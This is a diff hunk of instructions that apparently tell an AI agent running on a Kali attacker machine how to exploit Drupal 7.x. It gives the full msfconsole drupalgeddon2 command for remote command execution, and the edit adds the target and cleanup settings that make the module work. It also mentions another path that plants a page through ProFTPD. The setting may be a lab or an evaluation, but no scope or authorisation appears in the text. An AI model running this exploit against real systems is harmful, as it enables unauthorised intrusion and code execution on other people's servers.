@@ -425,10 +425,15 @@ IF — and only if — recon confirms a vulnerable Drupal 7.x version, turn it i
 command execution with Metasploit's real drupalgeddon2 module. msfconsole is on
 your Kali box; drive it non-interactively through `run_on_attacker` (a cold load
 is slow — give it the one call, it has time):
-  msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <target>; set RPORT 80; set TARGETURI <the path your own recon found>; set PAYLOAD cmd/unix/generic; set CMD id; run"
+  msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <target>; set RPORT 80; set TARGETURI <the path your own recon found>; set TARGET 2; set PAYLOAD cmd/unix/generic; set CMD id; set AllowNoCleanup true; run"
 TARGETURI MUST come from your own observed directory listing — the path Drupal is
 actually served from (`/`, `/drupal/`, whatever recon showed), never a hardcoded
 guess. RHOSTS is the target; RPORT 80 unless recon found Drupal on another port.
+TARGET 2 (Automatic Unix In-Memory) is REQUIRED — the module defaults to a PHP
+target that rejects `cmd/unix/generic` outright. AllowNoCleanup is REQUIRED too —
+this payload can't register the module's file-cleanup handler, and the module
+refuses to run without it. Both are mechanical requirements of the real module,
+not optional tuning.
 
 THE DUMPED COMMAND OUTPUT IS THE PROOF — no separate verify step this time:
 unlike the ProFTPD path (where you must curl the planted page yourself), the
